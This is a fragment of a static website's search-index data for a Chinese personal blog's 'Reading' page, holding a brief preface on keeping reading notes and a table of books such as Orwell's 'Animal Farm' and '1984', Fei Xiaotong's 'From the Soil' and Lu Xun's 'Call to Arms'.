​\t可能会在这里放一些简单的读书笔记或者思考之类的，毫无疑问，我们欠缺阅读，而在上大学之前的“阅读”，我都很难称之为阅读，或许有一个更好的词语。。。。。。\n​\t读书是要进行简单的记录的，对于我们阅读的速度和质量都有较好的把控。\n​\t原名和笔名都是出于对于作者的尊重。\nName Author Type 《动物庄园》 George Orwell 童话小说 《1984》 George Orwell 科幻小说 《为了活下去》 朴研美 人物传记 《乡土中国》 费孝通 社会学 《呐喊》 鲁迅 短，中篇小说集 《房思琪的初恋乐园》 林奕含 长篇小说 《思考，快与慢》 דניאל כהנמן（丹尼尔卡尔曼） 经济学科普 ","externalUrl":null,"permalink":"/reading/","section":"","summary":"\u003ch1 class=\"relative group\"\u003eReading \n    \u003cdiv id=\"reading\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#reading\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e​\t可能会在这里放一些简单的读书笔记或者思考之类的，毫无疑问，\u003cstrong\u003e我们欠缺阅读\u003c/strong\u003e，而在上大学之前的“阅读”，我都很难称之为阅读，或许有一个更好的词语。。。。。。\u003c/p\u003e\n\u003cp\u003e​\t读书是要进行简单的记录的，对于我们阅读的速度和质量都有较好的把控。\u003c/p\u003e\n\u003cp\u003e​\t原名和笔名都是出于对于作者的尊重。\u003c/p\u003e","title":"","type":"reading"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"}]